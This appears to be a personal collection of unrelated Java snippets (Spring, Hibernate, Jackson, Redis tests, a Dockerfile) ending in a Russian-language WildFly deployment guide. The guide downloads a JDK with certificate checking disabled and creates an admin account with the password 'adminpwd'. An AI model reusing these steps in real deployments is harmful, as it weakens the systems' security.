    @Convert(converter = PeriodStringConverter.class)
    @Column(columnDefinition = "")
    private Period span;

    //Getters and setters are omitted for brevity

}


--------------------------------------------------------------------------------------------------------
@Service
public class StudentCustomRepositoryServiceImpl implements StudentCustomRepository {

     @PersistenceContext
     private EntityManager em;

     @Override
     public void anyCustomMethod(){
         //here use the entityManager
     }

     @Override
     StudentEntity getStudentByName(String name){
         Criteria crit = em.unwrap(Session.class).createCriteria(StudentEntity.class);
         crit.add(Restrictions.eq("name", name));
         List<StudentEntity> students = crit.list();
         return students.get(0);
     }
 }
--------------------------------------------------------------------------------------------------------
 
import java.util.List;
 
import org.hibernate.SessionFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Repository;
 
import com.howtodoinjava.entity.EmployeeEntity;
 
@Repository
public class EmployeeDaoImpl implements EmployeeDAO
{
    @Autowired
    private SessionFactory sessionFactory;
    @Override
    public void addEmployee(EmployeeEntity employee) {
        this.sessionFactory.getCurrentSession().save(employee);
    }
    @SuppressWarnings("unchecked")
    @Override
    public List<EmployeeEntity> getAllEmployees() {
        return this.sessionFactory.getCurrentSession().createQuery("from EmployeeEntity").list();
    }
    @Override
    public void deleteEmployee(Integer employeeId) {
        EmployeeEntity employee = (EmployeeEntity) sessionFactory.getCurrentSession().load(
                EmployeeEntity.class, employeeId);
        if (null != employee) {
            this.sessionFactory.getCurrentSession().delete(employee);
        }
    }
}
--------------------------------------------------------------------------------------------------------
import com.fasterxml.jackson.annotation.JsonIgnore;
import com.paragon.microservices.distributor.model.constraint.ChronologicalDates;
import com.paragon.microservices.distributor.model.converter.AuthenticatedUserConverter;
import com.paragon.microservices.distributor.model.domain.AuthenticatedUser;
import com.paragon.microservices.distributor.system.utils.AuthenticationUtils;
import io.swagger.annotations.ApiModelProperty;
import lombok.AllArgsConstructor;
import lombok.NoArgsConstructor;
import lombok.Setter;
import lombok.experimental.UtilityClass;
import org.hibernate.Session;
import org.hibernate.annotations.CreationTimestamp;
import org.hibernate.annotations.DynamicInsert;
import org.hibernate.annotations.DynamicUpdate;
import org.hibernate.annotations.UpdateTimestamp;
import org.hibernate.tuple.ValueGenerator;
import org.springframework.data.annotation.CreatedBy;
import org.springframework.data.annotation.LastModifiedBy;
import org.springframework.data.domain.Auditable;
import org.springframework.data.jpa.domain.support.AuditingEntityListener;
import org.springframework.format.annotation.DateTimeFormat;

import javax.persistence.*;
import javax.validation.constraints.NotNull;
import java.io.Serializable;
import java.time.LocalDateTime;
import java.util.Objects;
import java.util.Optional;

import static com.paragon.microservices.distributor.model.entity.AuditModelEntity.AuditModelPersistable.*;
import static com.paragon.microservices.distributor.system.utils.DateUtils.DEFAULT_DATE_FORMAT_PATTERN_EXT;

/**
 * {@link AuditModelPersistable} entity
 *
 * @param <ID> type of model identifier {@link Serializable}
 */
@AllArgsConstructor
@NoArgsConstructor
@DynamicInsert
@DynamicUpdate
@MappedSuperclass
@ChronologicalDates
@EntityListeners(AuditingEntityListener.class)
@Converts({
        @Convert(attributeName = "createdBy", converter = AuthenticatedUserConverter.class),
        @Convert(attributeName = "lastModifiedBy", converter = AuthenticatedUserConverter.class)
})
public abstract class AuditModelEntity<ID extends Serializable> implements Auditable<AuthenticatedUser, ID, LocalDateTime>, Serializable {
    /**
     * Default explicit serialVersionUID for interoperability
     */
    private static final long serialVersionUID = 431774856692738135L;

    @Setter
    @CreationTimestamp
    @DateTimeFormat(iso = DateTimeFormat.ISO.DATE_TIME, pattern = DEFAULT_DATE_FORMAT_PATTERN_EXT)
    @NotNull(message = "{model.entity.audit.created-date.notNull}")
    @Column(name = CREATED_FIELD_NAME, nullable = false, updatable = false)
    private LocalDateTime createdDate;

    @Setter
    @CreatedBy
    @Basic(fetch = FetchType.LAZY)
    @NotNull(message = "{model.entity.audit.created-by.notNull}")
    @Column(name = CREATED_BY_FIELD_NAME, nullable = false, updatable = false, length = 512)
    //@GeneratorType( type = AuthenticationUserGenerator.class, when = GenerationTime.INSERT)
    private AuthenticatedUser createdBy;

    @Setter
    @UpdateTimestamp
    @DateTimeFormat(iso = DateTimeFormat.ISO.DATE_TIME, pattern = DEFAULT_DATE_FORMAT_PATTERN_EXT)
    @Column(name = MODIFIED_FIELD_NAME, insertable = false)
    //@GeneratorType( type = AuthenticationUserGenerator.class, when = GenerationTime.ALWAYS)
    private LocalDateTime lastModifiedDate;

    @Setter
    @LastModifiedBy
    @Basic(fetch = FetchType.LAZY)
    @Column(name = MODIFIED_BY_FIELD_NAME, insertable = false, length = 512)
    private AuthenticatedUser lastModifiedBy;

    @Override
    public Optional<LocalDateTime> getCreatedDate() {
        return Optional.ofNullable(this.createdDate);
    }

    @Override
    public Optional<AuthenticatedUser> getCreatedBy() {
        return Optional.ofNullable(this.createdBy);
    }

    @Override
    public Optional<LocalDateTime> getLastModifiedDate() {
        return Optional.ofNullable(this.lastModifiedDate);
    }

    @Override
    public Optional<AuthenticatedUser> getLastModifiedBy() {
        return Optional.ofNullable(this.lastModifiedBy);
    }

    @PrePersist
    protected void onCreate() {
        AuthenticationUtils.getAuthenticatedUser().ifPresent(this::setCreatedBy);
    }

    @PreUpdate
    protected void onUpdate() {
        AuthenticationUtils.getAuthenticatedUser().ifPresent(this::setLastModifiedBy);
    }

    @ApiModelProperty(hidden = true)
    @JsonIgnore
    @Override
    public boolean isNew() {
        return Objects.isNull(this.getId());
    }

    @UtilityClass
    public static final class AuditModelPersistable {
        public static final String CREATED_FIELD_NAME = "created";
        public static final String MODIFIED_FIELD_NAME = "modified";
        public static final String CREATED_BY_FIELD_NAME = "created_by";
        public static final String MODIFIED_BY_FIELD_NAME = "modified_by";
    }


    public static class AuthenticationUserGenerator implements ValueGenerator<AuthenticatedUser> {
        @Override
        public AuthenticatedUser generateValue(final Session session, final Object owner) {
            return AuthenticationUtils.getAuthenticatedUser().orElse(null);
        }
    }
}


java.util.concurrent.CompletionException: org.springframework.dao.DataIntegrityViolationException: could not initialize a collection batch:
--------------------------------------------------------------------------------------------------------
import com.paragon.microservices.distributor.model.entity.BaseAuditableEntity;
import org.springframework.data.repository.NoRepositoryBean;

import java.io.Serializable;

/**
 * {@link BaseAuditableEntity} repository declaration
 *
 * @param <E>  type of persistable {@link BaseAuditableEntity}
 * @param <ID> type of persistable {@link BaseAuditableEntity} identifier {@link Serializable}
 */
@NoRepositoryBean
public interface BaseRepository<E extends BaseAuditableEntity<ID>, ID extends Serializable> extends BaseJpaRepository<E, ID> {
}

--------------------------------------------------------------------------------------------------------
    @Override
    public <E extends Persistable<ID>> void saveOrUpdate(final E target, final Class<? extends E> entityClass) {
        log.info("Saving or updating target entity: {}, class: {}", target, entityClass);
        if (target.isNew()) {
            this.getEntityManager().persist(target);
        } else {
            final E targetEntity = this.getEntityManager().find(entityClass, target.getId());
            OptionalConsumer.of(targetEntity)
                    .ifPresent(e -> this.getEntityManager().merge(e))
                    .ifNotPresent(() -> this.getEntityManager().persist(target));
        }
    }
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.stream.Collectors;

import com.baeldung.jackson.entities.ActorJackson;

import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.ser.std.StdSerializer;

public class ActorJacksonSerializer extends StdSerializer<ActorJackson> {

    private SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy");

    public ActorJacksonSerializer(Class t) {
        super(t);
    }

    @Override
    public void serialize(ActorJackson actor, JsonGenerator jsonGenerator, SerializerProvider serializerProvider) throws IOException {

        jsonGenerator.writeStartObject();
        jsonGenerator.writeStringField("imdbId", actor.getImdbId());
        jsonGenerator.writeObjectField("dateOfBirth", actor.getDateOfBirth() != null ? sdf.format(actor.getDateOfBirth()) : null);
        jsonGenerator.writeNumberField("N° Film: ", actor.getFilmography() != null ? actor.getFilmography()
            .size() : null);
        jsonGenerator.writeStringField("filmography", actor.getFilmography()
            .stream()
            .collect(Collectors.joining("-")));
        jsonGenerator.writeEndObject();
    }
}
--------------------------------------------------------------------------------------------------------
import java.io.IOException;

import com.baeldung.jackson.enums.Distance;
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.ser.std.StdSerializer;

public class DistanceSerializer extends StdSerializer<Distance> {

    private static final long serialVersionUID = 1376504304439963619L;

    public DistanceSerializer() {
        super(Distance.class);
    }

    public DistanceSerializer(Class<Distance> t) {
        super(t);
    }

    public void serialize(Distance distance, JsonGenerator generator, SerializerProvider provider) throws IOException, JsonProcessingException {
        generator.writeStartObject();
        generator.writeFieldName("name");
        generator.writeString(distance.name());
        generator.writeFieldName("unit");
        generator.writeString(distance.getUnit());
        generator.writeFieldName("meters");
        generator.writeNumber(distance.getMeters());
        generator.writeEndObject();
    }
}
--------------------------------------------------------------------------------------------------------
import java.io.IOException;

import com.baeldung.jackson.entities.MyPair;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.DeserializationContext;
import com.fasterxml.jackson.databind.KeyDeserializer;

public class MyPairDeserializer extends KeyDeserializer {

    @Override
    public MyPair deserializeKey(String key, DeserializationContext ctxt) throws IOException, JsonProcessingException {

        return new MyPair(key);
    }
}
--------------------------------------------------------------------------------------------------------
public CompletableFuture<Person> get(String id) {
    // When creating future manually, it's important to include try/catch blocks.
    // This is because when an exception is thrown, we want to wrap it in a failed future.
    try {
        // cache is a simple Map<String, Person>.
        Person cached = cache.get(id);
        // If we have the object cached, simply wrap and return it.
        if (cached != null) {
            return CompletableFuture.completedFuture(cached);
        }
        // Object was not cached, create CompletableFuture to represent its future availability.
        CompletableFuture<Person> future = new CompletableFuture<>();
        // Code to fetch the Person here.
        // This example uses a legacy callback class as an example, but it could be any type of asynchronous code.
        databaseFetch(id, person -> {
            // Cache the person. (this step is specific to this example, included for completeness)
            cache.put(id, person);
            // Send the result to the future.
            future.complete(person);
        });
        // Return the future.
        return future;
    }
    // Wrap all errors in a failed future.
    catch (Throwable e) {
        // If errors happen, we use completeExceptionally() to report them.
        // The get() method itself should not throw any exceptions.
        CompletableFuture<Person> future = new CompletableFuture<>();
        future.completeExceptionally(e);
        return future;
    }
}
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.io.StringWriter;

import com.baeldung.jackson.entities.MyPair;
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonSerializer;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializerProvider;

public class MyPairSerializer extends JsonSerializer<MyPair> {

    private final ObjectMapper mapper = new ObjectMapper();

    @Override
    public void serialize(MyPair value, JsonGenerator gen, SerializerProvider serializers) throws IOException, JsonProcessingException {
        StringWriter writer = new StringWriter();
        mapper.writeValue(writer, value);
        gen.writeFieldName(writer.toString());
    }
}
--------------------------------------------------------------------------------------------------------
    @JsonGetter("publications")
    public List<Item> getItems() {
        return items;
    }
	
	    @JsonAnyGetter
    public Map<String, Float> getCountryDeliveryCost() {
        return countryDeliveryCost;
    }
	
	    @JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "ordertype")
    @JsonSubTypes({ @JsonSubTypes.Type(value = InternalType.class, name = "internal") })
    public static class Type {
        public long id;
        public String name;
    }

    @JsonTypeName("internal")
    public static class InternalType extends Type {
        public long id;
        public String name;
    }
	
	import com.fasterxml.jackson.annotation.JsonIgnoreType;

/**
 * Source code github.com/readlearncode
 *
 * @author Alex Theedom www.readlearncode.com
 * @version 1.0
 */
@JsonIgnoreType
public class IgnoreListMixIn {
}

@JsonAutoDetect(fieldVisibility = Visibility.ANY)
public class Order {
}
@JsonFormat(shape = JsonFormat.Shape.STRING, pattern = "yyyy-MM-dd@HH:mm:ss.SSSZ")
@JsonFormat(shape = JsonFormat.Shape.STRING, pattern = "yyyy-MM-dd@HH:mm:ss.SSSZ", locale = "en_GB")
@JsonFormat(shape = JsonFormat.Shape.NUMBER)

        final DateFormat formatter = new SimpleDateFormat("EEE MMM dd hh:mm:ss zzz yyyy", Locale.US);
        formatter.setTimeZone(TimeZone.getTimeZone("GMT"));
        return formatter.format(dateOfBirth);
		
import java.util.Map;

import com.baeldung.jackson.serialization.MyPairDeserializer;
import com.fasterxml.jackson.annotation.JsonCreator;
import com.fasterxml.jackson.annotation.JsonProperty;
import com.fasterxml.jackson.databind.annotation.JsonDeserialize;

public class ClassWithAMap {

    @JsonProperty("map")
    @JsonDeserialize(keyUsing = MyPairDeserializer.class)
    private final Map<MyPair, String> map;

    @JsonCreator
    public ClassWithAMap(Map<MyPair, String> map) {
        this.map = map;
    }

    public Map<MyPair, String> getMap() {
        return map;
    }
}
    @JacksonInject
    private UUID id;
	    @JsonDeserialize(using = CustomDateDeserializer.class)
    private Date published;
--------------------------------------------------------------------------------------------------------

import java.util.ArrayList;

import javax.jws.WebService;

import com.stackify.models.User;
import com.stackify.models.Users;

@WebService(endpointInterface = "com.stackify.services.UserService")
public class DefaultUserImpl implements UserService {

    ArrayList<User> usersList = new ArrayList<>();

    @Override
    public void addUser(User user) {
        usersList.add(user);
    }

    @Override
    public Users getUsers() {
        Users users = new Users();
        users.setUsers(usersList);
        return users;
    }

}
--------------------------------------------------------------------------------------------------------
#!/bin/sh

java -Dspring.profiles.active=$1 -Dlogging.config=/logback.xml -jar /app.war
--------------------------------------------------------------------------------------------------------
    @Bean
    public DataSource dataSource() {
        EmbeddedDatabaseBuilder builder = new EmbeddedDatabaseBuilder();
        EmbeddedDatabase db = builder.setType(EmbeddedDatabaseType.H2).addScript("mySchema.sql").addScript("myData.sql").build();
        return db;
    }
--------------------------------------------------------------------------------------------------------
import com.stackify.debug.JavaRemoteDebuggingApplication;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.web.support.SpringBootServletInitializer;

public class WebInitializer extends SpringBootServletInitializer {
    @Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
        return application.sources(JavaRemoteDebuggingApplication.class);
    }
}
--------------------------------------------------------------------------------------------------------
# Alpine Linux with OpenJDK JRE
FROM openjdk:8-jre-alpine
RUN apk add --no-cache bash

# copy fat WAR
COPY spring-boot-app-0.0.1-SNAPSHOT.war /app.war

# copy fat WAR
COPY logback.xml /logback.xml

COPY run.sh /run.sh

# runs application
#CMD ["/usr/bin/java", "-jar", "-Dspring.profiles.active=default", "-Dlogging.config=/logback.xml", "/app.war"]

ENTRYPOINT ["/run.sh"]

#CMD ["/usr/bin/java", "-jar", "-Dspring.profiles.active=default", "-Dlogging.config=/logback.xml", "/app.war"]
--------------------------------------------------------------------------------------------------------
import javax.persistence.Entity;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.TableGenerator;

@Entity
public class Department {
    @Id
    @GeneratedValue(strategy = GenerationType.TABLE, generator="table-generator")
    @TableGenerator (name="table-generator", table="dep_ids", pkColumnName="seq_id", valueColumnName="seq_value")
    private long depId;

    public long getDepId() {
        return depId;
    }

    public void setDepId(long depId) {
        this.depId = depId;
    }
}
--------------------------------------------------------------------------------------------------------
import org.slf4j.Marker;

import ch.qos.logback.classic.Level;
import ch.qos.logback.classic.Logger;
import ch.qos.logback.classic.turbo.TurboFilter;
import ch.qos.logback.core.spi.FilterReply;

public class IgnoreLoggerFilter extends TurboFilter {

    private String loggerName;

    @Override
    public FilterReply decide(Marker marker, Logger logger, Level level, String format, Object[] params, Throwable t) {
        if (loggerName == null) {
            return FilterReply.NEUTRAL;
        } else if (loggerName.equals(logger.getName())) {
            return FilterReply.DENY;
        } else
            return FilterReply.NEUTRAL;
    }

    public void setLoggerName(String loggerName) {
        this.loggerName = loggerName;
    }

}
--------------------------------------------------------------------------------------------------------
import com.google.common.util.concurrent.AtomicLongMap;

public class AtomicLongMapTutorials {

    private AtomicLongMap<String> atomicLongMap;

    public AtomicLongMapTutorials() {
        atomicLongMap = AtomicLongMap.create();
    }

    public void addKeys() {
        atomicLongMap.addAndGet("apple", 250);
        atomicLongMap.addAndGet("bat", 350);
        atomicLongMap.addAndGet("cat", 450);
        atomicLongMap.addAndGet("dog", 550);
    }

    public static void main(String[] args) {
        AtomicLongMapTutorials atomicLongMapTutorials = new AtomicLongMapTutorials();
        atomicLongMapTutorials.addKeys();

        System.out.println(atomicLongMapTutorials.atomicLongMap.get("2"));
    }
}
--------------------------------------------------------------------------------------------------------
package com.baeldung.aspect;

public aspect ChangeCallsToCurrentTimeInMillisMethod {
    long around():
            call(public static native long java.lang.System.currentTimeMillis())
                    && within(user.code.base.pckg.*) {
        return 0;
    }
}
--------------------------------------------------------------------------------------------------------
redis-server --port 7777 --dbfilename test.rdb
--------------------------------------------------------------------------------------------------------
import static com.lordofthejars.nosqlunit.redis.RedisRule.RedisRuleBuilder.newRedisRule;
import static com.lordofthejars.nosqlunit.redis.ManagedRedis.ManagedRedisRuleBuilder.newManagedRedisRule;

import static org.junit.Assert.assertThat;
import static org.hamcrest.CoreMatchers.is;

import org.junit.ClassRule;
import org.junit.Rule;
import org.junit.Test;

import redis.clients.jedis.Jedis;

import com.lordofthejars.nosqlunit.annotation.UsingDataSet;
import com.lordofthejars.nosqlunit.core.LoadStrategyEnum;
import com.lordofthejars.nosqlunit.demo.model.Book;
import com.lordofthejars.nosqlunit.redis.ManagedRedis;
import com.lordofthejars.nosqlunit.redis.RedisRule;

public class WhenYouFindABook {

	static {
		System.setProperty("REDIS_HOME", "/opt/redis-2.4.17");
	}

	@ClassRule
	public static ManagedRedis managedRedis = newManagedRedisRule().build();

	@Rule
	public RedisRule redisRule = newRedisRule().defaultManagedRedis();
	
	@Test
	@UsingDataSet(locations="book.json", loadStrategy=LoadStrategyEnum.CLEAN_INSERT)
	public void book_should_be_returned_if_title_is_in_database() {
		
		BookManager bookManager = new BookManager(new Jedis("localhost"));
		Book findBook = bookManager.findBookByTitle("The Hobbit");
		
		assertThat(findBook, is(new Book("The Hobbit", 293)));
		
	}

}
--------------------------------------------------------------------------------------------------------
@Service
class RedisService {

    @Autowired
    private RedisTemplate<String, SomeClass> redisTemplate;

    SomeClass get(String key) {
        return redisTemplate.opsForValue().get(key);
    }

}

class IntegrationTest {

    @MockBean
    private RedisService redisService;

    @Before
    public void setup() {
        SomeClass someClass= new SomeClass();
        when(redisService.get(anyString())).thenReturn(someClass);
    }


}
--------------------------------------------------------------------------------------------------------
class ClassWithSafeVarargs<T> {

    @SafeVarargs
    final void iterateOverVarargs(T... args) {
        for (T x : args) {
            // do stuff with x
        }
    }
}

class ClassWithSuppressWarnings {

    @SuppressWarnings("deprecation")
    void useDeprecatedMethod() {
        ClassWithDeprecatedMethod.deprecatedMethod(); // no warning is generated here
    }
}
--------------------------------------------------------------------------------------------------------
zypper refresh
zypper install wget
--------------------------------------------------------------------------------------------------------
org.flips
stork.yml

https://www.baeldung.com/flowable
--------------------------------------------------------------------------------------------------------
wget --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie" "http://download.oracle.com/otn-pub/java/jdk/8u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-8u131-linux-x64.rpm"
rpm -ivh jdk-8u131-linux-x64.rpm

wget http://download.jboss.org/wildfly/8.2.1.Final/wildfly-8.2.1.Final.tar.gzip
wget 'https://onedrive.live.com/download?resid=C308FDFA0488C7FB!445569&authkey=!AP3V1xql-CohCTw&ithint=file%2czip'
wget 'https://onedrive.live.com/download?resid=C308FDFA0488C7FB!449995&authkey=!AJUA750qwiu6L4M&ithint=file%2czip'

deploy --force /путь к файлу/wmq.jmsra.rar

/usr/java/jdk1.8.0_131/jre/lib/security/java.security

securerandom.source=file:/dev/./urandom

useradd --system --comment "WildFly Application Server" --create-home --home /opt/wildfly --user-group wildfly

cd /opt/wildfly/wildfly-8.2.1.Final/bin/
./add-user.sh admin adminpwd --silent

jboss-cli.sh -c

https://docs.jboss.org/author/display/WFLY/Command+Line+Interface. 

module add --name=com.oracle --resources=/путь к драйверу/ojdbc7.jar --dependencies=javax.api,javax.transaction.api

/subsystem=datasources/jdbc-driver=oracle:add(driver-name="oracle",driver-module-name="com.oracle",driver-class-name=oracle.jdbc.driver.OracleDriver)
data-source add --jndi-name=java:jboss/datasources/RegisterDS --name= RegisterDS --connection-url=jdbc:oracle:thin:@<MAIN_DB_SERVER>:<MAIN_DB_PORT>/<MAIN_DB_SID> --driver-name=oracle --user-name=<MAIN_USER_NAME> --password=<MAIN_USER_PASSWORD> --enabled=true --min-pool-size=5 --max-pool-size=100 --pool-prefill=true --flush-strategy=IdleConnections --check-valid-connection-sql="select 1 from dual" --validate-on-match=false --background-validation=true --background-validation-millis=10000 --blocking-timeout-wait-millis=10000

data-source add --jndi-name=java:jboss/datasources/JMSDS --name=JMSDS --connection-url=jdbc:oracle:thin:@<QUEUE_DB_SERVER>:<QUEUE_DB_PORT>/<QUEUE_DB_SID> --driver-name=oracle --user-name=<QUEUE_USER_NAME> --password=<QUEUE_USER_PASSWORD> --enabled=true --min-pool-size=5 --max-pool-size=200 --pool-prefill=true --flush-strategy=IdleConnections --check-valid-connection-sql="select 1 from dual" --validate-on-match=false --background-validation=true --background-validation-millis=10000 --blocking-timeout-wait-millis=30000 --use-fast-fail=true 

•	MAIN_DB_SERVER – сетевое имя или ip-адрес сервера основной БД
•	MAIN_DB_PORT – номер порта сервера основной БД (стандартное значение для Oracle — 1521)
•	MAIN_DB_SID – имя сервиса основной БД или SID
•	MAIN_USER_NAME – имя пользователя основной БД
•	MAIN_USER_PASSWORD – пароль пользователя основной БД
•	QUEUE_DB_SERVER – сетевое имя или ip-адрес сервера БД очередей*
•	QUEUE_DB_PORT – номер порта сервера БД очередей (стандартное значение для Oracle — 1521)
•	QUEUE_DB_SID – имя сервиса БД очередей или SID
•	QUEUE_USER_NAME – имя пользователя БД очередей
•	QUEUE_USER_PASSWORD – пароль пользователя БД очередей

<datasource jndi-name="java:jboss/datasources/RegisterDS" pool-name="RegisterDS" enabled="true">
    <connection-url>jdbc:oracle:thin:@<MAIN_DB_SERVER>:<MAIN_DB_PORT>/<MAIN_DB_SID></connection-url>
    <driver>oracle</driver>
    <pool>
        <min-pool-size>5</min-pool-size>
        <max-pool-size>100</max-pool-size>
        <prefill>true</prefill>
    </pool>
    <security>
        <user-name><MAIN_USER_NAME></user-name>
        <password><MAIN_USER_PASSWORD></password>
    </security>
    <timeout>
        <blocking-timeout-millis>10000</blocking-timeout-millis>
    </timeout>
 <validation>
        <check-valid-connection-sql>select 1 from dual</check-valid-connection-sql>
        <validate-on-match>false</validate-on-match>
        <background-validation>true</background-validation>
        <background-validation-millis>10000</background-validation-millis>
    </validation>
</datasource>
<datasources>
<datasource jndi-name="java:jboss/datasources/JMSDS" pool-name="JMSDS" enabled="true">
    <connection-url>jdbc:oracle:thin:@<QUEUE_DB_SERVER>:<QUEUE_DB_PORT>/<QUEUE_DB_SID></connection-url>
    <driver>oracle</driver>
    <pool>
        <min-pool-size>5</min-pool-size>
        <max-pool-size>200</max-pool-size>
        <prefill>true</prefill>
        <flush-strategy>IdleConnections</flush-strategy>
    </pool>
    <security>
        <user-name><QUEUE_USER_NAME></user-name>
        <password><QUEUE_USER_PASSWORD></password>
    </security>
    <timeout>
        <blocking-timeout-millis>30000</blocking-timeout-millis>
    </timeout>
 <validation>
        <check-valid-connection-sql>select 1 from dual</check-valid-connection-sql>
        <validate-on-match>false</validate-on-match>
        <background-validation>true</background-validation>
        <background-validation-millis>10000</background-validation-millis>
        <use-fast-fail>true</use-fast-fail>
    </validation>
</datasource>


/system-property=rir.service.user:add(value="<RIR_USER>")
/system-property=dutydoctor.service.user:add(value="<DUTY_DOCTOR_USER>")
/system-property=contingent.service.user:add(value="<CONTINGENT_USER>")
/system-property=resources.service.address:add(value="<RESOURCES_URL>")
/system-property=schedule.service.address:add(value="<SCHEDULE_URL>")
/system-property=patient.service.address:add(value="<PATIENT_URL>")
/system-property=area.service.address:add(value="<AREA_URL>")
/system-property=app.time.zone:add(value="+03:00")
/system-property=spring.profiles.active:add(value="jndi")
/system-property=external.service.auth.token:add(value="<SERVICE_USER>")
/system-property=dutydoctor.service.address:add(value="<DUTY_DOCTOR_URL>")
/system-property=rir.service.user.super:add(value="<RIR_SUPER_USER>")
/system-property=systemlog.service.address:add(value="<SYSLOG_URL>")
/system-property=systemlog.service.user:add(value="<SYSLOG_USER>")
/system-property=treelogger.treeview:add(value="true")
/system-property=websphere.hostName:add(value="<WS_HOSTNAME>")
/system-property=websphere.port:add(value="<WS_PORT>")
/system-property=websphere.username:add(value="<WS_USERNAME>")
/system-property=websphere.password:add(value="<WS_PASSWORD>")
/system-property=websphere.channel:add(value="<WS_CHANEL>")
/system-property=websphere.transportType:add(value="CLIENT")
/system-property=websphere.queueManager:add(value="<WS_QUEUE_MANAGER>")
/system-property=websphere.queueName:add(value="<WS_QUEUE_NAME>")
/system-property=websphere.resource.adapter:add(value="wmq.jmsra.rar")
/system-property=anticorruption.rmi.service.port:add(value="1200")
/system-property=appointment.rmi.service.port:add(value="1201")
/system-property=rir.invoke.threads.max:add(value="4")
/system-property=rir.invoke.threads.params:add(value="20")


<system-properties>
    <property name="rir.service.user" value="<RIR_USER>"/>
    <property name="dutydoctor.service.user" value="<DUTY_DOCTOR_USER>"/>
 <property name="contingent.service.user" value="<CONTINGENT_USER>"/>
    <property name="resources.service.address" value="<RESOURCES_URL>"/>
    <property name="schedule.service.address" value="<SCHEDULE_URL>"/>
	 <property name="patient.service.address" value="<PATIENT_URL>"/>
	 <property name="area.service.address" value="<AREA_URL>"/>
    <property name="spring.profiles.active" value="jndi"/>
    <property name="app.time.zone" value="+03:00"/>
	 <property name="dutydoctor.service.address" value="<DUTY_DOCTOR_URL>"/>
	 <property name=" external.service.auth.token" value="<SERVICE_USER>"/>
	 <property name="rir.service.user.super" value="<RIR_SUPER_USER>"/>
	 <property name="systemlog.service.user" value="<SYSLOG_USER>"/>
	 <property name="systemlog.service.address" value="<SYSLOG_URL>"/>
	 <property name="treelogger.treeview" value="true"/>
    <property name="websphere.hostName" value="<WS_HOSTNAME>"/>
    <property name="websphere.port" value="<WS_PORT>"/>
    <property name="websphere.username" value="<WS_USERNAME>"/>
    <property name="websphere.password" value="<WS_PASSWORD>"/>
    <property name="websphere.channel" value="<WS_CHANEL>"/>
    <property name="websphere.transportType" value="CLIENT"/>
    <property name="websphere.queueManager" value="<WS_QUEUE_MANAGER>"/>
    <property name="websphere.queueName" value="<WS_QUEUE_NAME>"/>
    <property name="websphere.resource.adapter" value="wmq.jmsra.rar"/>
	 <property name=" anticorruption.rmi.service.port " value="1200"/>
    <property name=" appointment.rmi.service.port" value="1201"/>
    <property name="rir.invoke.threads.max" value="<MAX_THREADS>"/>
    <property name="rir.invoke.threads.params" value="PARAMS_PER_THREAD"/>
</system-properties>


/subsystem=infinispan/cache-container=RegisterCache:add(default-cache=default,start="EAGER")
/subsystem=infinispan/cache-container=RegisterCache/local-cache=default:add(batching="true",start="EAGER",module="org.infinispan")
/subsystem=infinispan/cache-container=RegisterCache/local-cache=default/file-store=FILE_STORE:add(path="register-cache",relative-to="jboss.server.temp.dir", shared=true,preload=true,passivation=false,fetch-state=true,purge=false,singleton=false

<subsystem xmlns="urn:jboss:domain:infinispan:2.0">
<cache-container name="RegisterCache" default-cache="default" start="EAGER">
<local-cache name="default" start="EAGER" batching="true" module="org.infinispan">
<file-store shared="true" preload="true" passivation="false" fetch-state="true" purge="false" singleton="false" relative-to="jboss.server.temp.dir" path="register-cache"/>
</local-cache>
 </cache-container>


/subsystem=logging/async-handler=logger:add(queue-length="16384",overflow-action="block",level="DEBUG")
/subsystem=logging/async-handler=logger:assign-subhandler(name="FILE")

/subsystem=logging/root-logger=ROOT:root-logger-assign-handler(name="logger")
/subsystem=logging/root-logger=ROOT:root-logger-unassign-handler(name="CONSOLE")
/subsystem=logging/root-logger=ROOT:root-logger-unassign-handler(name="FILE")

/subsystem=logging/logger=ru.gov.emias2/:add(category=ru.gov.emias2,level=DEBUG)
/subsystem=logging/logger=org.apache.camel/:add(category=org.apache.camel,level=DEBUG)

/subsystem=logging/logger=ru.gov.emias2/:add(category=ru.gov.emias2,level=INFO)
/subsystem=logging/logger=ru.gov.emias2/:add(category=ru.gov.emias2,level=DEBUG)
/subsystem=logging/logger=org.apache.camel/:add(category=org.apache.camel,level=DEBUG)

<subsystem xmlns="urn:jboss:domain:logging:2.0">
    <async-handler name="logger">
        <level name="DEBUG"/>
        <queue-length value="16384"/>
        <overflow-action value="block"/>
        <subhandlers>
            <handler name="FILE"/>
        </subhandlers>
    </async-handler>
    <periodic-rotating-file-handler name="FILE" autoflush="true">
        <formatter>
           <named-formatter name="PATTERN"/>
        </formatter>
        <file relative-to="jboss.server.log.dir" path="server.log"/>
        <suffix value=".yyyy-MM-dd"/>
        <append value="true"/>
    </periodic-rotating-file-handler>    
    <logger category="org.apache.tomcat.util.modeler">
        <level name="WARN"/>
    </logger>
    <logger category="org.jboss.as.config">
        <level name="DEBUG"/>
    </logger>
    <logger category="sun.rmi">
        <level name="WARN"/>
    </logger>
    <logger category="org.switchyard">
        <level name="INFO"/>
    </logger>
    <logger category="org.apache.deltaspike.core.api.provider.BeanManagerProvider">
        <level name="ERROR"/>
    </logger>
    <logger category="ru.gov.emias2">
        <level name="DEBUG"/>
    </logger>    
    <root-logger>
        <level name="INFO"/>
        <handlers>
            <handler name="logger"/>
        </handlers>
    </root-logger>
    <formatter name="PATTERN">
